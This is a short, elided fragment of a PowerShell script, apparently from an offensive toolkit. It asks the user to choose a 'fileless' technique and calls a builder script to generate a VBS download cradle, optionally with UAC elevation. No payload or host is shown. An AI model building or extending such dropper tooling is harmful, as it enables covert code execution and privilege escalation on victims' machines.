...
If($check -ieq $False)
{
  ...
  If($Python_version)
  {
    ...
    ElseIf($FlavorSellection -eq 4)
    {
       ...
       {
          $fuckOrNot = "fileless"
          $Technic = Read-Host "[i] Chose the FileLess Technic to add to crandle (1|2|3) "
       }
       Else
       {
          #Default (%tmp%)
       ...
       If($RunEXElevated -iMatch '^(y|yes)$')
       {
          ...
          powershell -file crandle_builder.ps1 -action "$fuckOrNot" -VbsName "Download_Crandle.vbs" -UACElevation 'true' -Technic "$Technic" -Egg 'true'|Out-Null
       }
       Else
       {
          powershell -file crandle_builder.ps1 -action "$fuckOrNot" -VbsName "Download_Crandle.vbs" -UACElevation 'false' -Technic "$Technic" -Egg 'true'|Out-Null
       }
